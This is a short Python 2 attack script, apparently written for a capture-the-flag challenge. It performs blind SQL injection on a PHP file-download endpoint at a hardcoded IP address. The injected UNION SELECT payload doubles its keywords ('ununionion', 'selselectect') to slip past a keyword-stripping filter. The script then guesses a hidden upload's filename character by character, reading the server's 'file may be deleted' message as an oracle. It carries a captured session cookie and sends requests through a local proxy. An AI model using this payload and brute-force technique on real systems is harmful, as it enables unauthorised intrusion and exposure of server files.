
#!/usr/bin/python
# coding:utf-8

import requests

def makeStr(begin, end):
    str = ""
    for i in range(begin, end):
        str += chr(i)
    return str

def getFilename():
    data="image=12 ununionion diisstinct selselectect 0x{filename} oisrorder by 1 desc&image_download=%E6%94%B6%E8%97%8F"
    url = "http://202.98.28.108:10012/52gw5g4hvs59/downfile.php"

    headers = {
        "Content-Type":"application/x-www-form-urlencoded",
        "Cookie":"PHPSESSID=gnvp9hok7l12bb9o1rj5ed7to3",
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
    }

    randStr=makeStr(48,122)[::-1]
    fileName = "./Up10aDs/fhbu7"
    for _ in range(33):
        print "[*]",fileName
        for i in randStr:
            # print i
            tmpFileName = fileName+i
            proxies = {"http":"127.0.0.1:8080"}
            #print data.format(filename=tmpFileName.encode("hex"))
            res = requests.post(url,data=data.format(filename=tmpFileName.encode("hex")),headers=headers,proxies=proxies)
            # print res.text
            if "file may be deleted" not in res.text:
                fileName = fileName + i
                break


if __name__ == '__main__':
    getFilename()



    


